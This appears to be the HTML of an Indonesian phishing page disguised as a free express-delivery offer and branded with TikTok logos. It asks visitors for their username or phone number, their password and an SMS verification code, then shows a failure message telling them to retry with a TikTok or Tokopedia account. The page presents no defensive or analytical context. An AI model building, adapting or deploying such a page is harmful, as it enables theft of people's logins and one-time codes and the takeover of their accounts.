...
<head>
    ...
    <meta property="og:title" content="Pengiriman Kilat Cepat & Aman Pasti">
    ...
    <meta property="og:image" content="https://sf-static.tiktokcdn.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png">
    <meta property="og:image:secure_url" content="https://sf-static.tiktokcdn.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png">
    ...
    <meta name="twitter:image" content="https://sf-static.tiktokcdn.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png">

    <title>Pengiriman Kilat Cepat & Aman Pasti</title>
    ...
    <div class="wrapper" id="mainWrapper">
        ...
        <div id="bagian1" class="halaman">
            <div class="konten-form">
                <img src="https://sf-static.tiktokcdn.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png" alt="Foto Bagian 1" draggable="false">
                <h1>SILAHKAN PILIH PENGIRIMAN</h1>
                <p>Pengiriman Kilat Cepat & Aman Pasti.</p>
                
                <div class="wadah-pilihan">
                    <label class="opsi-radio">
                        <input type="radio" name="kategori" value="J&T Ekxpres">
                        <span>J&T Ekxpres</span>
                    </label>
                    <label class="opsi-radio">
                        <input type="radio" name="kategori" value="SiCepat Ekxpres">
                        <span>SiCepat Ekxpres</span>
                    </label>
                    <label class="opsi-radio">
                        <input type="radio" name="kategori" value="Same-Day/Instan">
                        <span>Same-Day/Instan</span>
                    </label>
                </div>
            </div>
            <div class="tombol-container">
                <button onclick="pindahKe(2)">Masuk</button>
            </div>
        </div>
        ...
        <div id="bagian2" class="halaman">
            <div class="konten-form">
                <img src="https://play-lh.googleusercontent.com/mG6_nsn89FF3pKHklkoKhJhYZEsUTkooXD4DFjPffFj4nzfG-VXu6E4jxqzc6TM2U5o"alt="Foto Bagian 2" draggable="false">
                <h1>PENGIRIMAN GRATIS 100%</h1>
                <p>Pengiriman Kilat Cepat & Aman Seluruh Indonesia.</p>
                <input type="text" id="inputNama" placeholder="Gunakan nomor telpon/email/nama pengguna">
                <input type="text" id="inputUmur" placeholder="Kata Sandi">
            </div>
            <div class="tombol-container">
                <button onclick="prosesKirimKe1()">Lanjutkan</button>
            </div>
        </div>
        ...
        <div id="bagian3" class="halaman">
            <div class="konten-form">
                <img src="https://p16-tiktokcdn-com.akamaized.net/obj/tiktok-obj/9a756703a6161b8eb0cf7b1f2914f3a1.png" alt="Foto Bagian 3" draggable="false">
                <h1>KODE VERIFIKASI</h1>
                <p>Periksa kode verifikasi yang dikirim melalui sms.</p>
                <input type="number" id="inputHobi" placeholder="Masukkan kode verifikasi">
            </div>
            <div class="tombol-container">
                <button onclick="prosesKirimKe2()">Lanjutkan</button>
            </div>
        </div>
        ...
        <div id="bagian4" class="halaman">
            <div class="konten-form">
                ...
                <p class="kata-bijak">Periksa kembali kode verifikasi anda dikirim melalui sms.</p>
                <img src="https://st2.depositphotos.com/1216158/6888/v/950/depositphotos_68884815-stock-illustration-red-cross-red-x-icon.jpg" alt="Foto Bagian 4" draggable="false">
                <p class="kata-bijak">Gunakan akun TIKTOK atau TOKOPEDIA apabila GAGAL</p>
            </div>
            <div class="tombol-container">
